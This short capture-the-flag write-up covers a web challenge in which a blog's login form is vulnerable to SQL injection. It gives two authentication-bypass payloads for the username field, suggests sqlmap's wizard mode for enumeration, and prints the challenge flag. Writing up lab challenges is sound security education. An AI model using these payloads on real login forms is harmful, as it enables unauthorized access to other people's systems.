# Problem
Word on the street, Johnny's got a blog. Seems he doesn't know how to escape his inputs.

## Process
Enter the following into the username field and submit the form:
> ' or 1=1 or ''='

You could also enter the equivalent statement:
> ‘-0||’

You could also use sqlmap:
> sqlmap --wizard,
- It'll ask for the url (-u), then post data (none), injection difficulty (--level/--risk), and how much to enumerate

## Flag
flag{3sc4pe_Y0ur_1npu7s}

Resources:

- https://www.youtube.com/watch?v=glScQ9qqMlI
- http://niiconsulting.com/checkmate/2014/01/from-sql-injection-to-0wnage-using-sqlmap/

![mysqli](https://github.com/ryokubaka/CTF-Write-Ups/blob/master/NeverLAN-CTF-2019/Web/Images/web-sqli.jpg?raw=true)
